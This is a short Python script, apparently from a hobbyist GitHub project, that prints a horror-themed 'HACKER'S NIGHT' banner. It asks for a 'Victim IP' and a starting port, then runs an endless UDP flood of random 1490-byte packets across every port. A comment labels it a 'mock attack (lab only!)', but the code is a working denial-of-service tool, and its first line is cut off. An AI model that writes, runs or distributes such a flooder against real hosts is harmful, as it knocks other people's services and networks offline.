mport sys
import os
import time
import socket
import random
from datetime import datetime

# Clear screen and show horror-themed banner
os.system("clear")
os.system("figlet 'HACKER'S NIGHT'")
print("\n")
print("  🔥 A project by: FLASHbOY8")
print("  📎 GitHub      : https://github.com/FLASHbOY8\n")

print("  The lights flicker... a chill runs down the cable spine.")
print("  You've opened the gateway to the nether-net.")
print("  Beware... for what you unleash may echo through firewalls eternal.\n")

# Log current timestamp
now = datetime.now()
print(f"[{now.strftime('%Y-%m-%d %H:%M:%S')}] 🕯️ Ritual initiated...\n")

# UDP socket setup
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random._urandom(1490)

# Target info
target_ip = input("💀 Enter Victim IP        : ")
target_port = int(input("💣 Enter Starting Port    : "))

print("\nSummoning malicious packets...\n")
progress = [
    "[                    ] 0%",
    "[======>            ] 30%",
    "[============>      ] 60%",
    "[=================> ] 90%",
    "[===================] 100%"
]

for stage in progress:
    print(stage)
    time.sleep(1.2)

# Begin the mock attack (lab only!)
sent = 0
while True:
    sock.sendto(payload, (target_ip, target_port))
    sent += 1
    target_port += 1
    print(f"👻 [{sent}] Packet sent to {target_ip} on port {target_port}")
    if target_port > 65534:
        target_port = 1
